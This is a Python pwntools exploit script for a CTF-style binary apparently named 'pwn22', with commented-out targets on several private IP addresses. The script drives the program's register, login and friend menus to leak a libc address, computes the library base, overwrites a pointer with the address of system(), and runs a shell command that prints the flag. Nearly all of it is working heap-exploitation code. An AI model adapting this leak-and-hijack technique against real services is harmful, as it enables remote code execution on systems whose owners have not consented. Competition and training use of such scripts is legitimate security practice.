from pwn import *
#context.log_level = 'debug'
def pwn(ip, port):
    #libc = ELF('./libc.so')
    libc_offset = 0x3c4b78

    libc_offset = 0x3c67b8
    system_offset = 0x431B0
    env = {'LD_PRELOAD': './ld.so:./libc.so'}
    #p = process('./pwn22-bak', env)
    p = remote(ip, port)
    try:
    #p = process('./pwn22-bak')

    #gdb.attach(p)
        reg(p, 0x68, 'plusls', 10)
        reg(p, 0x68, 'aaa', 10)
        reg(p, 0x68, 'bbb', 10)
        reg(p, 0x68, 'ccc', 10)


        login(p, 'aaa')
        friend(p, 'a', 'aaa\x00')
        friend(p, 'd', 'aaa\x00')

        p.recvuntil('Your choice:')
        p.sendline('1')
        p.recvuntil('Age:')
        libc_ptr = int(p.recvuntil('\n')[:-1], 16)
        libc_base = libc_ptr - libc_offset
        log.success(hex(libc_ptr))
        log.success(hex(libc_base))

        p.recvuntil('Your choice:')
        p.sendline('6')

        payload = p64(0x602060) + p64(0)
        reg(p, 0x128, payload, 10)
        login(p, p64(libc_base + 0x377E0))

        p.recvuntil('Your choice:')
        p.sendline('2')
        p.recvuntil('Input your name:')
        p.send(p64(libc_base + system_offset)[:-2])
        p.recvuntil('Input your age:')
        p.sendline('1')
        p.recvuntil('Input your description:')
        p.send('1')
        p.send('echo fuck1 && cat flag\x00')
        p.recvuntil('fuck1\n')
        flag = p.recvuntil('\n')[:-1]
    except:
        pass
    p.close()
    return flag

def login(p, name):
    p.recvuntil('Your choice:')
    p.sendline('1')
    p.recvuntil('Please input your user name:')
    p.send(name)

def reg(p, size, name, age):
    p.recvuntil('Your choice:')
    p.sendline('2')
    p.recvuntil('Input your name size:')
    p.sendline(str(size))
    p.recvuntil('Input your name:')
    p.send(name)
    p.recvuntil('Input your age:')
    p.sendline(str(age))

def friend(p, opt, name):
    p.recvuntil('Your choice:')
    p.sendline('3')
    p.recvuntil("Input the friend's name:")
    p.send(name)
    p.recvuntil('(a/d)')
    p.sendline(opt)

if __name__ == '__main__':
    pass
    #pwn('127.0.0.1', 8888)
    #pwn('172.16.5.70', 5066)
    #pwn('172.16.9.22', 8889)